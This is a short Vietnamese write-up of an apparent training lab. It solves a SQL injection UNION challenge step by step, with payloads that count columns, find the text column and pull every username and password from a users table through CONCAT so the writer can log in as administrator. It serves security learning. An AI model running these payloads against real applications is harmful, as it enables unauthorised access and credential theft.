# Đầu bài cho biết:
- Ứng dụng có lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm.
- Kết quả truy vấn được trả về trong phản hồi của ứng dụng, cho phép sử dụng tấn công UNION.
- Cơ sở dữ liệu có một bảng khác tên là users, với các cột username và password.
# Yêu cầu:
- Thực hiện tấn công SQL injection UNION để truy xuất tất cả tên người dùng và mật khẩu từ bảng users.
- Sử dụng thông tin này để đăng nhập với tư cách người dùng administrator.


- Kiểm tra số lượng cột để gắn bằng `UNION`

`' UNION SELECT NULL, NULL FROM users--`

- Kiểm tra kiểu định dạng của các cột
- Thì chỉ có cột thứ 2 là cho định dạng dạng **String**

`' UNION SELECT NULL, 'a' FROM users--`

- Kiểm tra sự xuất hiện của username và password ở cột 2

`' UNION SELECT NULL, username FROM users--`

`' UNION SELECT NULL, password FROM users--`

- Vì chỉ có 1 cột có khả năng xem được ở dạng **String** nên ta ghép cả 2 lại thành cùng 1 cột và cách nhau bởi dấu ":" bằng hàm CONCAT() - 1 hàm dùng để nối 2 hay nhiều chuỗi với nhau
> SOLVE: `' UNION SELECT NULL, CONCAT(username, ':', password) FROM users--`
